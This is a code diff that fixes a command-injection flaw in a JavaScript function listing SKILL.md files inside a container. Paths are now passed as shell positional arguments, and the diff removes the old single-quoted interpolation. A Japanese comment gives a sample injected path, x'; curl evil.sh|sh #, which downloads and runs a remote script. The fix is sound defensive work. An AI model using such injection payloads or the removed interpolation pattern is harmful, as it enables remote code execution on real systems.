@@ -60,17 +60,23 @@ function pluginGroup(dir) {
 /** コンテナ内の SKILL.md を（プロジェクト / 個人 / プラグイン）横断で列挙する。 */
 export async function listSkills(name, workspacePath) {
   const dirs = roots(workspacePath).map((r) => r.dir);
-  const find = `find ${dirs.map((d) => `'${d}'`).join(' ')} -mindepth 2 -iname SKILL.md 2>/dev/null`;
-  const { stdout: pathList } = await execCapture(name, ['sh', '-c', find]);
+  // dirs はコード上の固定パス（PERSONAL_ROOT 等）と containers.config.json の
+  // workspacePath から組み立てた値で、攻撃者が自由に決められる値ではないが、
+  // 念のためこちらも位置引数 "$@" 経由で渡し、シェル文字列への埋め込みはしない。
+  const findScript = 'for d in "$@"; do find "$d" -mindepth 2 -iname SKILL.md 2>/dev/null; done';
+  const { stdout: pathList } = await execCapture(name, ['sh', '-c', findScript, 'sh', ...dirs]);
 
   const paths = pathList.split('\n').map((p) => p.trim()).filter(Boolean);
   if (paths.length === 0) return [];
 
+  // paths はコンテナ内で見つかった実在パスだが、コンテナ内のエージェント
+  // （Write ツールを持つ役割）が自由に作れるディレクトリ名を含むため信頼できない。
+  // 旧実装はこれをシェル文字列へ単一引用符で埋め込んでおり、パスに単一引用符を
+  // 含む名前（例: `x'; curl evil.sh|sh #`）を作られるとコマンドインジェクションが
+  // 成立した。位置引数として渡し、シェルには一切解釈させないことで防ぐ。
   // 1回の exec で全ファイルの先頭部分をまとめて取得する（ファイル数ぶん exec すると遅い）。
-  const catCmd = paths
-    .map((p) => `printf '${SEP}%s\\n' '${p}'; head -c ${HEAD_BYTES} '${p}'`)
-    .join('; echo; ');
-  const { stdout } = await execCapture(name, ['sh', '-c', catCmd]);
+  const catScript = `for p in "$@"; do printf '${SEP}%s\\n' "$p"; head -c ${HEAD_BYTES} "$p"; echo; done`;
+  const { stdout } = await execCapture(name, ['sh', '-c', catScript, 'sh', ...paths]);
 
   const chunks = stdout.split(SEP).slice(1);
   const skills = [];
